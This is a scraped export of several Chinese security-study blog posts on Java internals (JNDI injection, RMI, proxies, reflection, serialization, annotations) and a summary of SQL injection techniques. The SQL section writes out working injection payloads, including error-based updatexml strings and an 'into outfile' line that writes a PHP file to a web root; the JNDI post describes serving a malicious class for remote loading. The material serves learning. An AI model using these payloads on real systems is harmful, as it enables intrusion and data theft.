getFactoryClassName()：检索此引用引用对象的工厂的类名 Object remove(int posn)：从地址列表中删除索引posn上的地址 int size()：检索此引用中的地址数 String toString()：生成此引用的字符串表示形式 示例代码： 这里将reference传入了ReferenceWrapper类，因为在RMI中说到过，远程接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；而远程接口实现类还必须继承java.rmi.server.UnicastRemoteObject。可参考：Java RMI Reference类既没有实现远程接口，又没有继承UnicastRemoteObject，所以不能直接使用；而ReferenceWrapper类继承了UnicastRemoteObject类，还实现了RemoteReference接口；[3] RemoteReference接口又继承了Remote接口，所以Reference对象要用ReferenceWrapper封装一下。[4] 造成JNDI注入的原因则是initialContext.lookup(url)中的url可控，即查询的远程对象可控，通过构造恶意远程对象，对目标服务发起攻击。 JNDI+RMI实现攻击示例代码代码就是上面的两个示例，这里再写一下； JNDI_Server： JNDI_Client： 还要写一个要加载的恶意类，把编译后的class文件放到可访问的网站上，如url = &quot;;；这里要注意必须得去掉package ...后再编译，不然执行不成功。CalcCmd： 代码写好后，先启动服务端，开启监听，再启动客户端；成功加载到远程对象；[5] 流程分析还是先启动服务端，然后在initialContext.lookup(url)处断点；跟进lookup，这里是解析name的上下文；[6] 跟进下一个lookup，检索解析成功的对象，继续查找为解析的名称部分；[7] 跟进下一个lookup，到达decodeObject；[8] 跟进decodeObject，获取从ReferenceWrapper_Stub返回的Reference对象；[9] 跟进getObjectInstance，获取到了Factory的类名（CalcCmd），然后从Reference中获取Factory的实例；[10] 跟进getObjectFactoryFromReference，通过clas = helper.loadClass(factoryName);尝试用当前的类加载器看是否能加载到Factory类，这里能加载到；如果不能加载到，则通过clas = helper.loadClass(factoryName, codebase);进行远程加载；[11] 分别跟进看一下，如果在本地能加载到，就直接获取Factory类对象；[12] 如果不能加载到，就使用URLClassLoader从指定地址远程动态加载；[13] 最后如果(clas != null)，就实例化加载到的类，而这里加载到的类就是CalcCmd，实例化后即可执行类里面的代码。[14] 调用栈如下：[15] JNDI+LDAP实现攻击示例代码和RMI差不多，先起一个LDAP服务； 模拟一个客户端： 同样需要放一个编译后的恶意class文件在可访问的网站上； 启动服务端后再启动客户端，命令执行成功； 参考链接："},{"title":"Java RMI","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20RMI/","categories":[[" ",""]],"content":"概述定义：RMI全称 **远程方法调用(Remote Method Invocation)**，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。Java RMI： 用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。 组成部分：RMI由三部分组成： RMI Registry：JDK提供的一个可独立运行的程序（bin目录下）； RMI Server：服务端程序，对外提供远程对象，代码在这里执行，将执行结果返回给客户端； RMI Client：客户端程序，想要调用远程对象的方法。 示例1. 定义远程接口首先定义一个远程接口，该接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；定义一个sayHello()方法供远程调用，这个方法必须抛出java.rmi.RemoteException异常； 在Java中，Remote接口用于标识其方法可从非本地虚拟机调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”中指定的那些方法是远程可用的。 2.定义远程接口实现类定义一个类来实现远程接口ServiceInterface，并且需要继承java.rmi.server.UnicastRemoteObject；实现类里面必须要定义一个显式构造函数，并且抛出java.rmi.RemoteException异常；实现sayHello()方法，可以添加一个@Override注解，避免出错； 远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。 3. 服务端注册远程对象，向客户端提供远程对象服务； 远程对象是在远程服务上创建的，无法准确的知道远程服务器上的对象的名称，不过将远程对象注册到RMI Registry之后，客户端就可以通过RMI Registry请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了。 4. 客户端客户端向服务端请求远程对象服务； 从RMI Registry中请求stub，如果RMI Registry在本地机器上，url就是rmi://localhost:port/绑定名，如果在远程机器上url就是rmi://RMI Service_IP:port/绑定名； 5. 远程方法调用过程首先启动RMIService，对指定端口进行监听；然后RMIService将自己提供的服务的实现类注册到RMIRegistry上，并指定一个访问路径；最后启动RMIClient，客户端通过本地接口和事先约定好的路径到RMIRegistry上去拿到实现类，所有的方法都在接口里，便可以任意调用远程对象的方法了。 调用结果如下：[1] 参考链接："},{"title":"Java 动态代理","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","categories":[[" ",""]],"content":"概述代理模式：代理模式是Java常用的一种结构型设计模式，给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。代理类主要负责为被代理类（真实对象）预处理消息、过滤消息，然后将消息传递给被代理类，之后还能对消息进行后置处理。代理类不实现具体服务，而是通过调用被代理类中的方法来完成服务，并将执行结果封装处理。 通过代理对象访问目标对象可以在实现目标对象的基础上，又在不改变目标对象方法的情况下，对方法进行增强，即扩展目标对象的功能。 根据字节码的创建时机来分类，可以分为静态代理和动态代理： 静态代理： 在程序运行前就已经存在代理类的字节码文件，代理类与被代理类的关系在运行前就确定了。 动态代理： 代理类是在程序运行期间由JVM根据反射等机制动态生成的，程序运行前并不存在代理类的字节码文件。 静态代理定义一个接口： 定义一个被代理类，即目标对象，实现这个接口及其抽象方法： 创建代理类，实现与目标对象相同的接口，引用代理对象，调用该对象的方法，还可添加其他功能： 测试类，通过代理对象调用方法，进而调用目标对象的方法，然后将结果返回： 程序运行结果：[1] 静态代理的缺点： 由于代理类需实现与目标对象相同的接口，当有多个需被代理的类时，只有两种方法： 只创建一个代理类，这个代理类同时实现多个接口及其抽象方法，但是会导致代理类过于庞大； 创建多个代理类，每个代理类对应一个被代理类，但是会长生过多代理类； 当接口需要增加、删除、修改方法时，被代理类和代理类的代码都要修改，代码量过大，不易维护。 JDK动态代理接口和被代理类不变，创建一个调用处理器ProxyHandler类，并实现InvocationHandler接口； invoke的三个参数： proxy：被代理的对象 method：调用的方法 args：方法中的参数 动态代理测试类： 程序运行结果：[2] 动态代理实现步骤： 通过实现 InvocationHandler 接口创建自己的调用处理器； 通过为 Proxy 类指定 ClassLoader 对象和一组 interface 来创建动态代理类； 通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型； 通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。 代理对象生成过程代理对象的生成使用了java.lang.reflect.Proxy类的newProxyInstance方法，看一下源码： 再看看生成代理类的getProxyClass0； 继续跟ProxyClassFactory， 生成代理类的字节码文件用到了generateProxyClass，跟进： 使用generateClassFile()方法生成代理类的字节码文件，跟进： 生成字节码文件后，调用defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);解析字节码文件，进而生成代理对象。 参考链接："},{"title":"Java 命令执行","date":"2022-09-19T11:27:30.000Z","url":"/2022/09/19/Java%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","categories":[[" ",""]],"content":"Runtime类测试代码 实现过程补充：Runtime类的exec的重载方法： public Process exec(String command) throwsIOException public Process exec(String command,String[] envp) public Process exec(String command,String[] envp, File dir) public Process exec(String cmdarray[])throws IOException 跟进一下getRuntime方法，该方法直接返回currentRuntime对象，而currentRuntime对象是上面Runtime的实例化对象；也就是说每次调用getRuntime()方法都会实例化一个Runtime对象。[1] 再跟一下exec方法，该方法又返回了一个exec方法；[2] 继续跟，该方法又返回了一个exec方法；[3] 继续跟，new了一个ProcessBuilder对象，调用了start方法；[4] 跟进start方法，该方法又执行了ProcessImpl类中的start静态方法；[5] 继续跟，后面new了一个ProcessImpl的对象；[6] 跟进ProcessImpl，444行创建了一个subprocess，也就是在这里，命令成功执行；[7] 调用流程： public Process exec(String command) public Process exec(String command, String[] envp, File dir) public Process exec(String[] cmdarray, String[] envp, File dir) ProcessBuilder.start() ProcessImpl.start() new ProcessImpl creat()最后返回的就是一个ProcessImpl对象。 反射调用Runtime如果不利用反射执行命令，当需要执行多个命令时，就显得很复杂繁琐，这时候就可以使用反射。 测试代码： 程序运行结果：[8] ProcessBuilder类从上面分析Runtime的实现流程可以知道，执行命令的过程中调用了ProcessBuilder的start方法，那么我们直接实例化ProcessBuilder的对象，调用start方法； 测试代码： [9] ProcessImpl类同样，上面两种类执行命令的过程中都调用了ProcessImpl类的start方法，但是该类是私有的，不能直接实例化，可以通过反射的方式调用； 测试代码： 程序运行结果：[10] 参考链接："},{"title":"Java序列化与反序列化","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[[" ",""]],"content":"概述什么是序列化和反序列化：Java 序列化：把Java对象转换为字节序列的过程；Java 反序列化：把字节序列还原为Java对象的过程； 对象序列化的两种用途： 把对象的字节序列永久的保存到硬盘上，通常放到一个文件中； 在网络上传输对象的字节序列； 当大量用户访问Web服务器时，就会创建大量Session对象，占据大量内存资源，于是Web服务器就会把一些Session对象序列化存放到硬盘中，需要使用的时候再将字节序列反序列化为对象到内存中；由于两个进程之间的通信时，数据是以二进制形式进行传输，所以发送方需要把Java对象序列化为字节序列，才能再网络上传输，接收方则把收到的字节序列反序列化为对象。 Java类库中的序列化相关APIjava.io.Serializable接口Java类通过实现java.io.Serializable接口来启用序列化功能。没有实现此接口的类无法使其任何状态序列化或反序列化；实现了该接口的可序列化类的所有子类型本身都是可序列化的；序列化接口没有方法或字段，仅用于标识可序列化的语义。 ObjectOutputStream类：序列化流作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为序列化，可实现对象的持久存储。特有成员方法：writeObject(Object obj)将指定的对象写入 ObjectOutputStream；writeObject 方法用于将对象写入流中。所有对象（包括 String 和数组）都可以通过 writeObject 写入。 ObjectInputStream类：反序列化流作用：将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象，称为反序列化。特有成员方法：Object readObject()从 ObjectInputStream 读取对象。 java.io.Externalizable接口 示例java.io.Serializable创建一个Person类，需要实现Serializable接口； transient关键字可以使被声明的变量不被序列化到文件中，当反序列化时，transient变量的值恢复为初始值，即int型是0，对象型是null； 创建一个SerializeDemo1类来实现序列化和反序列化； 程序运行结果如下，生成了per.txt，保存序列化后的数据：[1] java.io.ExternalizableJava还提供了另一个序列化接口java.io.Externalizable，下面来看看与java.io.Serializable的区别；将Person类改为实现java.io.Externalizable接口，该接口继承了java.io.Serializable接口，并且有两个抽象方法writeExternal()和readExternal()； 程序运行结果如下：[2] 反序列化后所有参数的值都恢复成了默认值，意味着对象的状态并没有被持久化下来；这就是Serializable接口与Externalizable接口的区别，通过Serializable接口对对象序列化的支持是内建于核心 API 的，但是java.io.Externalizable的所有实现者必须提供读取和写出的实现；也就是要实现writeExternal()和readExternal()方法； 实现两个抽象方法： 实现后，程序运行结果如下：[3] 静态变量的序列化示例代码：在Person类中添加一个静态变量： 在SerializeDemo1类中修改并输出静态变量，其他不变； 最后静态变量的输出结果是修改后的值18；[4] 按道理反序列化时读取的staticVar应该是序列化时保存的状态20才对，试验结果却不是这样；那是因为静态变量是属于类的状态，而序列化只保存对象的状态，所以序列化时并不保存静态变量，因此静态变量输出值为18； serialVersionUID即序列化版本号，是Java程序运行时环境根据类的内部细节自动生成的；该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类。如果接收者加载的该对象的类的 serialVersionUID 与对应的发送者的类的版本号不同，则反序列化将会导致 InvalidClassExceptio。如果对类的源代码进行了修改，再重新编译，新生成的类文件的serialVersionUID的取值有可能也会发生变化。类的serialVersionUID的默认值完全依赖于Java编译器的实现，对于同一个类，用不同的Java编译器编译，有可能会导致不同的 serialVersionUID，也有可能相同。为了提高serialVersionUID的独立性和确定性，强烈建议在一个可序列化类中显示的定义serialVersionUID，为它赋予明确的值。 小结 Java类只有实现Serializable接口或Externalizable接口才可启用序列化功能； 当一个对象被序列化时，只保存对象的非静态成员变量； 如果一个对象发成员变量是一个对象，那么这个对象的数据成员也会被序列化； 使用transient关键字声明不需要被序列化的变量； 如果父类实现序列化，那么子类就自动实现序列化，不需要再显式实现Serializable接口； 显式定义serialVersionUID。 参考链接："},{"title":"Java反射","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%8F%8D%E5%B0%84/","categories":[[" ",""]],"content":"概述反射：框架设计的灵魂 框架：半成品软件；可以在框架的基础上进行软件开发，简化编码。 反射：将类的各个组成部分封装为其他对象。 下面大概介绍一下Java代码在计算机中经历的三个阶段： 第一阶段——Source源代码阶段：首先写一个类文件Person.java，类里面可以写一些成员变量、构造方法、成员方法等；经过javac编译后在硬盘上生成一个字节码文件Person.class，里面保存了成员变量、构造方法、成员方法等； 第二阶段——Class类对象阶段通过类加载器把字节码文件加载到内存里，内存中有一个Class 类对象（描述所有字节码文件的共同特征和行为），将成员变量封装为Field[ ]对象，构造方法封装为Constructor[ ]对象，成员方法封装为Method[ ]对象 第三阶段——Runtime运行时阶段new一个Person对象[1] 反射的好处： 可以在程序运行过程中，操作这些对象； 可以降低程序的一些耦合性，提高程序的可扩展性。 获取Class对象三种方式 Class.forName(&quot;全类名&quot;)：将字节码文件加载进内存，返回Class对象； 多用于配置文件，将类名定义在配置文件中；读取文件，加载类。 类名.class：通过类名的属性class获取； 多用于参数的传递。 对象.getClass()：getclass()方法在Object类中定义； 多用于对象的获取字节码的方式。 示例代码在cn.blckder02.domain下创建一个Person类，定义两个成员变量：[2] 再创建一个student类，作对比，暂时不用写内容；在cn.blckder02.reflect下创建一个ReflectDemo1类，分别用以上三种方法获取Class对象，代码如下： 程序运行结果如下，前两个比较都为true，说明同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个；第三个比较为false，说明每个字节码文件对应的Class类对象都不相同。[3] 使用Class对象Class对象的获取功能 获取成员变量们 Field[ ] getFields() 获取所有public修饰的成员变量 Field getField(String name) 获取指定名称public的成员变量 Field[ ] getDeclaredFields() 获取所有成员变量，不考虑修饰符 Field getDeclaredField(String name) 获取所有指定名称的成员变量，不考虑修饰符 获取构造方法们 Constructor&lt;?&gt;[ ] getConstructors() 获取所有public修饰的构造方法 Constructor getConstructor(类&lt;?&gt;… parameterTypes) 获取指定名称public的构造方法 Constructor&lt;?&gt;[ ] getDeclaredConstructors() 获取所有构造方法，不考虑修饰符 Constructor getDeclaredConstructor(类&lt;?&gt;… parameterTypes) 获取所有指定名称的构造方法，不考虑修饰符 获取成员方法们 Method[ ] getMethods() 获取所有public修饰的成员方法 Method getMethod(String name, 类&lt;?&gt;… parameterTypes) 获取指定名称public的成员方法 Method[ ] getMethods() 获取所有成员方法，不考虑修饰符 Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) 获取所有指定名称的成员方法，不考虑修饰符 获取类名 String getName() 示例1. 获取成员变量们在Person类中按如下属性添加a、b、c、d四个成员变量，并重新设置toString()方法； 获取成员变量后可做操作： 设置值：void set(Object obj, Object value) 获取值：get(Object obj) 忽略访问权限修饰符的安全检查：setAccessible(true)（暴力反射） 在cn.blckder02.reflect下创建ReflectDemo2类，代码如下： 由于getFields()只能获取public修饰的成员变量，所以第一个只输出a；而getDeclaredFields()能获取所有成员变量，所以输出每个成员变量；getDeclaredField(String name)不能直接访问私有成员变量，但是可以使用setAccessible()方法，忽略访问权限修饰符的安全检查来访问。程序运行结果如下：[4] 2. 获取构造方法们getConstructors()方法同样只能获取public修饰的构造方法。构造方法的名称都与类名相同，唯一的区别就是参数不同，所以在获取带参构造方法时要传入相应的参数。通过构造器来创建对象，需要用到newInstance()方法；如果使用空参构造方法创建对象，可以直接使用Class对象的newInstance()方法，简化代码，获取到的结果是一样的。同样可以通过暴力反射setAccessible()方法获取私有构造方法。 在cn.blckder02.reflect下创建ReflectDemo3类，代码如下： 程序运行结果如下：[5] 3. 获取成员方法们在person类中添加一个空参成员方法eat()，一个带参成员方法eat(String food)： 指定名称获取成员方法时，需要传入方法名以及参数。执行方法时，需要用到invoke()方法，要传入方法对象和实际的参数列表； 获取所有public修饰的成员方法时，不仅会得到自己设置的几个方法，还有Object类、父类等的方法。调用方法的getName()可以获取到方法名称。同样可以通过暴力反射setAccessible()方法获取私有成员方法。 在在cn.blckder02.reflect下创建ReflectDemo4类，代码如下： 程序运行结果如下：[6] 4. 获取类名调用类的getName()方法，获取到的是全类名；[7] 案例目的： 写一个类似“框架”的程序，在不改变程序任何代码的情况下，我们可以创建任意类对象，并执行其中方法。可以通过写配置文件和反射技术来实现；步骤： 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 在程序中加载读取配置文件 使用反射技术来加载文件进内存 创建对象 执行方法 示例代码：配置文件config，类名参数值要写全类名： 测试程序ReflectTest.java： 程序运行结果：[8] 在不改动ReflectTest.java代码的情况下，修改配置文件，来调用student类中的sleep方法；[9] 此时程序运行结果：[10] 这就是框架的基本形式，只用修改少量地方，就能实现多种方法；而反射就是去获取我们看不见的构造器、对象、方法等。 参考链接："},{"title":"Java注解","date":"2022-09-19T11:25:30.000Z","url":"/2022/09/19/Java%E6%B3%A8%E8%A7%A3/","categories":[[" ",""]],"content":"概述什么是注解？跟注释一样吗？注解和注释可不一样，注释是用文字描述、解释程序，是给程序员看的，为了让程序员更快速的了解程序功能；而注解是一种代码级别的说明，用来说明程序，是给计算机看的，可理解为给程序贴上了一个标签。 百度百科是这样解释的： 注解，可以看作是对 一个 类&#x2F;方法 的一个扩展的模版，每个 类&#x2F;方法 按照注解类中的规则，来为 类&#x2F;方法 注解不同的参数，在用到的地方可以得到不同的 类&#x2F;方法 中注解的各种参数与值； 从JDK5开始，java增加了对元数据（描述数据属性的信息）的支持。其实说白就是代码里的特殊标志，这些标志可以在编译，类加载，运行时被读取，并执行相应的处理，以便于其他工具补充信息或者进行部署。 使用格式：@注解名称[(属性值)] 作用分类： 编写文档：通过代码里标识的元数据生成文档【生成文档doc文档】 代码分析：通过代码里标识的元数据对代码进行分析【使用反射】 编译检查：通过代码里标识的元数据让编译器能够实现基本的编译检查【Override】 这里简单演示一下生成文档：新建一个类，里面写一个add()方法，并且添加了一些文档注释，文档注释里面又使用了一些注解；这些注解可以被抽取到Javadoc文档中；[1] 将AnnoDemo1.java文件单独保存到一个文件夹中，在命令行中执行javadoc AnnoDemo1.java，就生成了许多html文档；[2] 打开index.html，里面就可以看到我们创建的类和方法的信息，包括我们写的文档注释和使用的注解。[3] 后面两种作用下面慢慢演示。 内置注解在java.lang包中，可理解为JDK中预定义的一些注解； 内置注解有以下五类：1. @Override检测被该注解标注的方法是否是继承自父类（接口）的，可以确保子类确实重写了父类的方法，避免出现低级错误； 添加一个toString()方法，这个方法使用了 @Override注解，那么就要检测这个toString()方法是否与Object类中的toString()方法相同；如果相同则没有报错；[4] 如果不同则报错说这个方法不是来自它的父类；[5] 2. @Deprecated表示该注解标注的内容已过时，但是仍然可以调用，只不过会出现删除线； 先写了一个show1()方法，没过多久，发现这个show1()方法有缺陷，于是又新写了一个show2()方法，从而给show1()方法添加了@Deprecated注解，表示不建议使用该方法了；如果非要使用show1()方法，就会出现删除线；那为什么不删除show1()方法呢？因为还会存在有用户使用低版本的环境，删掉就不兼容了。[6] 3. @SuppressWarnings取消被该注解标注的元素及其子元素编译器显示的警告（消除警告）； 没有添加注解前，会出现许多这样的警告；[7] @SuppressWarnings注解带有一个value属性，所以使用时要给value传值，一般写all，消除所有警告；[8] 一般把@SuppressWarnings添加到定义类的前面，这样该类的所有警告都会消失；[9] 4. “堆污染”警告与@SafeVarargs消除警告； 想理解这个就要明白什么是堆污染，堆污染是什么？就是把不带泛型的对象赋给一个带泛型的对象，为什么不行？因为不带泛型的话，默认会给泛型设定为object，意思就是什么类型都可以往里面塞，那你一个不带泛型的怎么可能给一个带泛型塞呢。 那什么是泛型呢？泛型，顾名思义就是广泛的数据类型，有多广泛，什么数据类型都行；像下面这段代码，在类名后面声明泛型T，那么其中的成员变量、成员方法就可以使用泛型来定义，可以给这个变量传入各种类型的值；[10] 注意：可变参数更容易引发堆污染异常，因为java不允许创建泛型数组，可变参数恰恰是数组。 下面这段代码method方法接受的是一个泛型为Integer类型的Set集合，而main方法中，将一个没有泛型的set对象传给method方法时，则可能造成堆污染，出现警告；[11] 抑制这个警告的方法有三个: @SafeVarargs修饰引发该警告的方法或构造器 使用@suppressWarnings(“unchecked”) 编译时使用-Xlint:varargs [12] 5. 函数式接口与@Functionallnterface用于检查我们写的接口是否与函数式接口定义时的相符合； 什么是函数式接口？一个接口，这个接口里面只能有一个抽象方法； 定义一个接口，里面定义一个抽象方法，用@FunctionalInterface注解，没有报错；[13] 如果在里面定义两个抽象方法，就会出现报错。[14] 元注解在java.lang.annotation包下，可以标注注解的一些注解； 元注解有以下五种：1. @Retention当它标注到一个注解上时，它的属性就是该注解的存活时间； @Retention有一个属性，有以下三种取值： RetentionPolicy.SOURCE：注解只在源码阶段保留，在编译器进行编译时它将被丢弃忽视； RetentionPolicy.CLASS：注解只被保留到编译进行的时候，它并不会被加载到 JVM 中； RetentionPolicy.RUNTIME：注解可以保留到程序运行的时候，它会被加载进入到 JVM 中，所以在程序运行时可以获取到它们。使用格式：@Retention(RetentionPolicy.SOURCE) 2. @Documented能够将被@Documented标注的类中的注解提取到Javadoc中去。 3. @Target指定被标注的注解运用的地方； @Target有一个属性，有以下几种取值，可选用多个值，用逗号隔开： ElementType.ANNOTATION_TYPE 可以给一个注解进行注解 ElementType.CONSTRUCTOR 可以给构造方法进行注解 ElementType.FIELD 可以给属性进行注解 ElementType.LOCAL_VARIABLE 可以给局部变量进行注解 ElementType.METHOD 可以给方法进行注解 ElementType.PACKAGE 可以给一个包进行注解 ElementType.PARAMETER 可以给一个方法内的参数进行注解 ElementType.TYPE 可以给一个类型进行注解，比如类、接口、枚举使用格式：@Target(ElementType.TYPE,ElementType.PACKAGE) 4. @Inherited如果一个A方法被@Inherited和其他一些注解所标注，B方法继承了A方法，且B方法没有被任何注解标注，那么B方法就自动继承标注A方法的所有注解。 5. @Repeatable先看个例子来： 上面的代码中先定义了一个Persons注解，然后定义了一个Person注解，并且用@Repeatable来注解这个注解，而@Repeatable后面的括号相当于一个容器注解，可以理解为存放其他注解的地方，即Persons，它本身也是一个注解；然后用@Person注解去标注Man方法，可以给@Person注解中的role属性赋值，Man方法在拥有@Person注解的属性的同时，也拥有@Persons注解的属性。 注解的属性注解的属性就相当于接口的抽象方法； 定义一个注解@Person： 当只有一个属性name的时候，使用时可以不带属性名称： 有多个属性时，使用时就必须写明属性名称及值，多个属性之间用逗号隔开： 也可以将属性用default关键字指定为默认值，使用时可写为@Person()： 没有属性时就只用写@Person。 属性的返回类型可以是： 八种基本类型 String类型 Class类型 注解类型 枚举类型 以上五种类型的数组类型 自定义注解看了前面那么多例子，差不多也知道注解该怎么写了；格式： 注解本质上就是一个接口，默认继承java.lang.annotation.Annotation；Annotation是所有注解类型扩展的公共接口，手动扩展这个接口不限定注解类型，且此接口本身不是注解类型。 使用注解使用注解的目的是获取注解中定义的属性值，而注解是通过反射获取的；以Java反射中的ReflectTest.java为例，注解可以用来替换1、2步配置文件的相关操作； 先自定义一个注解@Anno1： 写一个Demo1，定义一个show1方法： 再写一个Demo2，定义一个show2方法： 把ReflectTest.java搬过来，用注解替换配置文件部分的操作，然后通过反射获取类名和方法名，最后执行获取到的方法，代码如下： 程序运行结果：[15] 其中： 意思就是在内存中生成了一个该注解(本质是接口)的子类实现对象，可以理解为下面代码： Anno1Impl 实现了Anno1注解（接口），并且复写了Anno1中的两个方法，返回了使用Anno1注解时两个属性的值；anno.className()调用的className()方法就相当于是调用的Anno1Impl 中的className()方法；anno.methodName()同理。 通过修改使用注解时属性的值，便可以获取到不同的方法； [16] 案例写一个Check注解，用于检测被标注的方法是否出错： 写一个计算器，给每个计算方法前都加上@Check注解： 再写一个TestCheck测试程序，将出现的异常写到bug.txt中： 执行TestCheck.java，输出如下：[17] 只输出了sub和mul方法的计算结果，说明add和div方法出现了异常；查看生成的bug.txt，里面记录了异常信息：[18] 小结 注解是提供数据用来解释程序代码的，是给编译器、解析程序看的； 注解不是程序的一部分，无论添加与否都不影响程序的执行； 注解的提取需要借助于 Java 的反射技术，反射比较慢，所以注解使用时也需要谨慎计较时间成本。 参考链接："},{"title":"学习总结","date":"2022-09-16T11:31:58.000Z","url":"/2022/09/16/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","categories":[[" ",""]],"content":"SQL注入 概述：SQL注入就是一些web应用程序将前端用户可控的参数传入后端，带入数据库查询的操作；造成SQL注入的基本原因是没有对用户传入参数的合法性进行严格的判断，以至于攻击者可以构造任意SQL语句对数据库进行操作。 SQL注入漏洞产生的条件？ 参数用户可控：前端传给后端的参数内容是用户可以控制的； 参数带入了数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。 (所以开发者最好不要完全相信外部输入的参数)一、 union注入 判断是数字型还是字符型： 根据?id=1 and 1=1和?id=1 and 1=2判断是否为数字型，返回不同则为数字型 [sql-1] 根据?id=1&#39; and 1=1 #和?id=1&#39; and 1=2 #判断是否为字符型，返回不同则为字符型 原理：将union左边的语句报错，则会显示union右边我们执行的查询语句 常用语句：order by、union select、group_concat() 代码层面：是否将查询到的数据输出到页面 (使用union注入要写成?id&#x3D;-1，即id不存在) 二、报错注入 概述：在注入过程中根据回显的报错信息进行判断。 常用报错函数：floor()、updatexml()、extractvalue()。 **floor()**： floor()返回小于等于该值的最大整数，可以理解为向下取整，只保留整数部分 floor(rand(0)*2)根据参数x有规律的随机生成0和1，以使每次注入都稳定报错 select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 当配合group by使用时，如果查询的内容不存在，则会新建，但是在新建的过程中rand又进行了一次计算，所以插入的是第二次计算的值，那么在后面如果查询到不存在的值，已经准备新建一个值了，但是经过第二次rand计算后，插入的则是第二次计算的值，如果这个值已经存在，就会出现报错。 updatexml：对XML文档进行修改UPDATEXML (XML_document, XPath_string, new_value);?id=1&#39; and updatexml (1,concat(0x7e,database(),0x7e),1) --+extractvalue：从目标XML中返回包含所查询值的字符串EXTRACTVALUE (XML_document, XPath_string); and extractvalue(null,concat(0x7e,(select @@datadir),0x7e)); updatexml和extractvalue报错原理：都是第二个参数必须是Xpath格式的字符串，而我们使用的concat()函数，不符合Xpath格式，所以会出现格式错误 updatexml和extractvalue的局限性：最大长度是32位，查询的长度超过32位就不会显示出来 代码层面：是否把报错信息输出到页面 三、布尔盲注 概述：只有查询正确或错误两种回显情况，构造逻辑语句，通过判断语句内容的真假回显获取有用信息（与查询成功回显正常，不成功无回显） 常用判断信息：名称长度，逐字符判断名称（可用burp进行爆破） 可以用length来判断数据库名称的长度，substr来逐个判断名称的字符；?id=1&#39; and length(database())=8 --+、?id=1 and substr(database(),1,1)=&#39;s&#39; --+ 从代码层面判断是否有布尔注入：根据用户传入的参数，只显示正确和错误两种情况，并不返回数据库中的任何信息。四、时间盲注 概述：通过if语句，判断正确时执行sleep，若页面正常时间回显，则判断条件错误，延迟回显，则判断条件正确 语法：if(条件, 正确sleep, 错误返回)、?id=1&#39; and if(length(database())=9,1,sleep(3)) --+、&#96;and if(length(database())&#x3D;8,benchmark(10000,md5(‘a’)),1) 常用判断信息：名称长度，具体字符 指利用sleep()、benchmark()等函数让SQL语句执行时间延长，从而根据回显时间长短来判断是否存在时间盲注漏洞；(benchmark(表达式执行次数，执行的表达式)) 代码层面和布尔注入一样，至少没有过滤sleep()等函数。 五、二次注入 概述：向数据库中插入带有经过转义的特殊字符的恶意数据（如1\\&#39;），而数据库在写数据时将转义字符去掉了；在另一处调用这条数据时，如果没有很好的过滤检测，未经无转义的特殊字符数据就会被取出来，拼接执行sql语句 示例：注册一个带有特殊字符的用户名Dumb&#39; -- -，修改密码再次调用这个用户名时，后面的内容会被注释掉，即成为修改Dumb用户的密码 [sql-2] 六、堆叠注入 概述：通过;连接执行多个sql语句 局限性：可能受到API或者数据库引擎不支持的限制，或者权限不足 缺点：web页面只能返回一条查询语句返回的结果，读取数据时优先使用union注入 条件：能执行多条语句（如：使用PDO执行SQL语句时） 七、宽字节注入 概述：MYSQL默认的是GBK等宽字节字符集，当我们传入&#39;单引号之类的特殊符号时，会被转义函数（如addslashes()）添加\\进行转义；如果输入%df&#39;就会变为%df\\&#39;，再遇上GBK编码，变成%df%5c&#39;，而在GBK编码中%df%5c又被认为是构成一个汉字運，所以就相当于没有进行转义，addslashes()等转义函数不起作用。 代码分析：使用了GBK编码，对输入参数进行了转义 八、XFF注入 概述：X-Forwarded-For简称XFF头，代表客户端的真实IP，可以用过修改XFF头来伪造IP。 判断是否存在XFF注入：构造语句127.0.0.1&#39; and 1=1 #和127.0.0.1&#39; and 1=2 #，如果两个语句返回结果不同，则存在XFF注入 代码分析：在获取IP地址后，将IP地址带入SQL语句查询。 九、文件操作 load_file(“E:\\user.txt”) 读文件 outfile写文件 ： &#39;union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;C:\\\\phpstudy\\PHPTutorial\\\\WWW\\\\sqli\\\\Less-7\\\\2.php&#39;dumpfile区别：outfile可以导出多行数据，dumpfile只能导出一行数据； 当写入一个二进制文件时，使用outfile在转义的过程中会破环文件，而dumpfile不会，dumpfile也不会对任何列行进行终止，也不会执行转义处理。 update 更新数据 ：update users set password=&#39;admin&#39; where 